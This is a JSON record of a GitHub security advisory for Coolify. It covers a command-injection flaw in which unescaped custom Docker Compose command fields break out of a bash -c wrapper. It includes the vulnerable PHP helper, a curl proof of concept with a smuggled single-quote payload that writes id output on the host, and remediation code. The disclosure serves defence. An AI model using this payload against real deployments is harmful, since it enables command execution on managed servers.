@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-6h8g-wpxp-cq98",
+  "repo": {
+    "cve_id": "CVE-2026-27955",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\r\n\r\nThe `executeInDocker()` helper wraps commands in `bash -c '{$command}'` without escaping single quotes. User-controlled `docker_compose_custom_build_command` and `docker_compose_custom_start_command` fields are interpolated directly, allowing a single quote to break out of the `bash -c` argument and execute commands on the managed server host (outside the intended Docker container context).\r\n\r\nThe codebase demonstrates awareness of this issue - `build_args_string` and `post_deployment_command` are escaped with `str_replace(\"'\", \"'\\\\''\", ...)` - but the custom compose command fields are not.\r\n\r\n## Severity\r\n\r\n**Medium** (CVSS 3.1: 6.6)\r\n\r\n`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L`\r\n\r\n- **Attack Vector:** Network\r\n- **Attack Complexity:** Low\r\n- **Privileges Required:** High (requires `api.ability:write` and application update authorization)\r\n- **User Interaction:** None\r\n- **Scope:** Changed (escapes from Docker container to managed server host)\r\n- **Confidentiality Impact:** Low\r\n- **Integrity Impact:** Low\r\n- **Availability Impact:** Low\r\n\r\n### Severity Rationale\r\n\r\nThe CVSS is lower than the report's initial \"High\" claim because:\r\n\r\n1. The attacker requires write-scoped API access AND application update authorization (`$this->authorize('update', $application)` at `ApplicationsController.php:2463`)\r\n2. Users with application deployment access already have significant server control (can deploy arbitrary Dockerfiles, compose files, and Docker images)\r\n3. The builder container already has Docker socket access for `docker compose build`, so the container boundary is already thin\r\n4. The escape is to the managed server host, not the Coolify control plane\r\n\r\n## Affected Component\r\n\r\n- `bootstrap/helpers/docker.php` - `executeInDocker()` (line 140)\r\n- `app/Jobs/ApplicationDeploymentJob.php` - lines 706, 772, 799 (custom compose commands passed unescaped)\r\n\r\n## CWE\r\n\r\n- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command\r\n\r\n## Description\r\n\r\n### The Vulnerable Helper\r\n\r\n```php\r\n// bootstrap/helpers/docker.php:140-144\r\nfunction executeInDocker(string $containerId, string $command)\r\n{\r\n    return \"docker exec {$containerId} bash -c '{$command}'\";\r\n    // No escaping of single quotes in $command\r\n}\r\n```\r\n\r\n### Inconsistent Escaping\r\n\r\nThe codebase escapes single quotes for `executeInDocker()` in some code paths but not others:\r\n\r\n| Field | Escaped | Location |\r\n|-------|---------|----------|\r\n| `build_args_string` | Yes (`str_replace(\"'\", \"'\\\\''\", ...)`) | `ApplicationDeploymentJob.php:693, 725` |\r\n| `post_deployment_command` | Yes (`str_replace(\"'\", \"'\\''\", ...)`) | `ApplicationDeploymentJob.php:3923` |\r\n| `docker_compose_custom_build_command` | **No** | `ApplicationDeploymentJob.php:706` |\r\n| `docker_compose_custom_start_command` | **No** | `ApplicationDeploymentJob.php:772, 799` |\r\n\r\nComments at lines 692 and 724 explicitly state: `// Escape single quotes for bash -c context used by executeInDocker` - proving the developers understand the risk but failed to apply the defense consistently.\r\n\r\n### Unescaped Code Paths\r\n\r\n```php\r\n// Line 676-706 - build command (no escaping)\r\nif ($this->docker_compose_custom_build_command) {\r\n    $build_command = injectDockerComposeFlags(\r\n        $this->docker_compose_custom_build_command, ...\r\n    );\r\n    // ... no str_replace(\"'\", ...) here ...\r\n    $this->execute_remote_command(\r\n        [executeInDocker($this->deployment_uuid, \"cd {$this->basedir} && {$build_command}\"), ...],\r\n    );\r\n}\r\n\r\n// Line 762-772 - start command (no escaping)\r\nif ($this->docker_compose_custom_start_command) {\r\n    $start_command = injectDockerComposeFlags(\r\n        $this->docker_compose_custom_start_command, ...\r\n    );\r\n    // ... no str_replace(\"'\", ...) here ...\r\n    $this->execute_remote_command(\r\n        [executeInDocker($this->deployment_uuid, \"cd {$this->workdir} && {$start_command}\"), ...],\r\n    );\r\n}\r\n```\r\n\r\n### Input Validation\r\n\r\nNo model-level accessor or mutator exists for `docker_compose_custom_build_command` or `docker_compose_custom_start_command` on the Application model. The API validates them only as `'string|nullable'` (`ApplicationsController.php:2478-2479`).\r\n\r\n### Execution Chain\r\n\r\n1. User sets `docker_compose_custom_build_command` to `docker compose build'; id > /tmp/escape; #`\r\n2. `executeInDocker()` returns: `docker exec UUID bash -c 'cd /dir && docker compose build'; id > /tmp/escape; #'`\r\n3. This is wrapped in an SSH heredoc by `generateSshCommand()` and sent to the managed server\r\n4. The remote `bash -se` processes the heredoc line-by-line, interpreting the single-quote breakout\r\n5. `id > /tmp/escape` executes on the managed server host, outside the Docker container\r\n\r\n## Proof of Concept\r\n\r\n```bash\r\nBASE_URL='https://<coolify-host>'\r\nTOKEN='<api_token_with_write_scope>'\r\nAPP_UUID='<docker_compose_application_uuid>'\r\n\r\n# 1) Set a malicious custom build command\r\ncurl -sS -X PATCH \"$BASE_URL/api/v1/applications/$APP_UUID\" \\\r\n  -H \"Authorization: Bearer $TOKEN\" \\\r\n  -H 'Content-Type: application/json' \\\r\n  --data-binary '{\r\n    \"docker_compose_custom_build_command\": \"docker compose build'\\''; id > /tmp/container_escape; #\"\r\n  }'\r\n\r\n# 2) Trigger a deployment\r\ncurl -sS -X POST \"$BASE_URL/api/v1/applications/$APP_UUID/start\" \\\r\n  -H \"Authorization: Bearer $TOKEN\"\r\n\r\n# On the managed server:\r\n# cat /tmp/container_escape\r\n# uid=0(root) gid=0(root) groups=0(root)\r\n# (file written by the server host, not inside any container)\r\n```\r\n\r\n## Impact\r\n\r\n- **Container boundary violation:** Custom compose commands intended to run inside the builder container can execute on the managed server host\r\n- **Inconsistent security posture:** The escaping gap creates a false sense of security - some fields are protected while structurally identical fields are not\r\n- **Host-level access:** While the user already has significant server access through deployments, this bypasses any container isolation the builder provides\r\n\r\n## Recommended Remediation\r\n\r\n### Option 1: Fix `executeInDocker()` (preferred)\r\n\r\nEscape single quotes at the source so all callers are protected:\r\n\r\n```php\r\nfunction executeInDocker(string $containerId, string $command)\r\n{\r\n    $escaped = str_replace(\"'\", \"'\\\\''\", $command);\r\n    return \"docker exec {$containerId} bash -c '{$escaped}'\";\r\n}\r\n```\r\n\r\nThis is the correct fix because it protects all ~60+ call sites, not just the two custom compose commands.\r\n\r\n**Note:** After this fix, the manual escaping at lines 693, 725, and 3923 should be removed to avoid double-escaping.\r\n\r\n### Option 2: Escape at the call sites\r\n\r\nApply the same escaping already used for `build_args_string`:\r\n\r\n```php\r\n$build_command = str_replace(\"'\", \"'\\\\''\", $build_command);\r\n$start_command = str_replace(\"'\", \"'\\\\''\", $start_command);\r\n```\r\n\r\nThis is less robust (easy to miss future call sites) but matches the existing pattern.\r\n\r\n## Credit\r\n\r\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).\r\n",
+    "ghsa_id": "GHSA-6h8g-wpxp-cq98",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-6h8g-wpxp-cq98",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6h8g-wpxp-cq98"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-27955"
+      }
+    ],
+    "published_at": "2026-06-25T15:24:31Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Command Injection via Single-Quote Breakout in `executeInDocker()`",
+    "updated_at": "2026-06-25T15:24:31Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "coolify"
+        },
+        "patched_versions": "v4.0.0-beta.464",
+        "vulnerable_version_range": "<4.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
